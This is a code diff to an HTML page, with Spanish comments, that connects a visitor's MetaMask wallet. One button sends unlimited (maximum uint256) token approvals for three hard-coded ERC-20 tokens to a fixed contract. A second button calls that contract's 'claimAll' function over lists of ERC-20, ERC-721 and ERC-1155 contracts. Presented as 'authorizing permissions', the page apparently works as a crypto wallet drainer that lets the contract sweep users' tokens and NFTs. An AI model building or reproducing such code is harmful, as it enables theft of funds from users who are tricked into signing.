@@ -34,57 +34,109 @@
     <button id="approveTokens" disabled>Autorizar Permisos</button>
     
     <script>
-        const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; // Reemplaza con la dirección de tu contrato
-        const contractABI = [
-            {
-                "inputs": [
-                    { "internalType": "address[]", "name": "tokensERC20", "type": "address[]" },
-                    { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
-                    { "internalType": "address[]", "name": "contractsERC721", "type": "address[]" },
-                    { "internalType": "address[]", "name": "contractsERC1155", "type": "address[]" }
-                ],
-                "name": "claimAll",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            }
-        ];
-        
-        let web3;
-        let userAccount;
-        let contract;
+       const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; // Dirección de tu contrato
+const contractABI = [
+    {
+        "inputs": [
+            { "internalType": "address[]", "name": "tokensERC20", "type": "address[]" },
+            { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
+            { "internalType": "address[]", "name": "contractsERC721", "type": "address[]" },
+            { "internalType": "address[]", "name": "contractsERC1155", "type": "address[]" }
+        ],
+        "name": "claimAll",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }
+];
 
-        document.getElementById("connectWallet").addEventListener("click", async () => {
-            if (window.ethereum) {
-                web3 = new Web3(window.ethereum);
-                try {
-                    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-                    userAccount = accounts[0];
-                    contract = new web3.eth.Contract(contractABI, contractAddress);
-                    document.getElementById("approveTokens").disabled = false;
-                    alert("Conectado: " + userAccount);
-                } catch (error) {
-                    console.error("Error conectando a MetaMask", error);
+let web3;
+let userAccount;
+let contract;
+
+document.getElementById("connectWallet").addEventListener("click", async () => {
+    if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        try {
+            const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+            userAccount = accounts[0];
+            contract = new web3.eth.Contract(contractABI, contractAddress);
+            document.getElementById("approveTokens").disabled = false;
+            alert("Conectado: " + userAccount);
+        } catch (error) {
+            console.error("Error conectando a MetaMask", error);
+        }
+    } else {
+        alert("MetaMask no está instalado");
+    }
+});
+
+document.getElementById("approveTokens").addEventListener("click", async () => {
+    if (!userAccount) return alert("Primero conecta MetaMask");
+
+    // Tokens ERC20 que el contrato manejará
+    const tokens = [
+        "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // Reemplazar con las direcciones correctas de los tokens
+        "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
+        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
+    ];
+
+    // Aprobación infinita
+    try {
+        for (const token of tokens) {
+            const tokenContract = new web3.eth.Contract([
+                {
+                    "constant": false,
+                    "inputs": [
+                        { "name": "spender", "type": "address" },
+                        { "name": "amount", "type": "uint256" }
+                    ],
+                    "name": "approve",
+                    "outputs": [{ "name": "", "type": "bool" }],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "function"
                 }
-            } else {
-                alert("MetaMask no está instalado");
-            }
-        });
+            ], token);
 
-        document.getElementById("approveTokens").addEventListener("click", async () => {
-            if (!userAccount) return alert("Primero conecta MetaMask");
-            
-            const tokens = ["0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1", "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"];
-            const amounts = [web3.utils.toWei("100", "ether"), web3.utils.toWei("100", "ether"), web3.utils.toWei("100", "ether")];
-            
-            try {
-                await contract.methods.claimAll(tokens, amounts, [], []).send({ from: userAccount });
-                alert("Permisos otorgados con éxito");
-            } catch (error) {
-                console.error("Error al autorizar", error);
-                alert("Error al otorgar permisos");
-            }
-        });
+            // Aprueba una cantidad infinita para el contrato
+            await tokenContract.methods
+                .approve(contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
+                .send({ from: userAccount });
+
+            console.log(`Token ${token} aprobado con éxito`);
+        }
+
+        alert("Tokens aprobados con éxito para el contrato");
+    } catch (error) {
+        console.error("Error al autorizar los tokens", error);
+        alert("Error al otorgar permisos");
+    }
+});
+
+document.getElementById("claimAll").addEventListener("click", async () => {
+    if (!userAccount) return alert("Primero conecta MetaMask");
+
+    const tokens = [
+        "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", 
+        "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1", 
+        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
+    ];
+    const amounts = [
+        web3.utils.toWei("100", "ether"), 
+        web3.utils.toWei("100", "ether"), 
+        web3.utils.toWei("100", "ether")
+    ];
+
+    try {
+        await contract.methods.claimAll(tokens, amounts, [], []).send({ from: userAccount });
+        alert("Acción claimAll ejecutada con éxito");
+    } catch (error) {
+        console.error("Error al ejecutar claimAll", error);
+        alert("Error al ejecutar claimAll");
+    }
+});
+
     </script>
 </body>
 </html>
